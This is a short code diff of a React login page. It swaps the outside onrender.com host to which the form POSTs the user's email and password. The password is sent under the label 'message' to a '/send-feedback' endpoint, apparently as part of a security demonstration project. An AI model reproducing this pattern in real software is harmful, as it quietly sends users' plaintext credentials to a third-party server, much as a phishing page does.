@@ -11,7 +11,7 @@ export default function LoginPage() {
     setStatus("Sending...");
 
     try {
-      const response = await fetch("https://projet-securite-1-05t0.onrender.com/send-feedback", {
+      const response = await fetch("https://securite2026.onrender.com/send-feedback", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ email, message: password }), // sending password as "message" for example
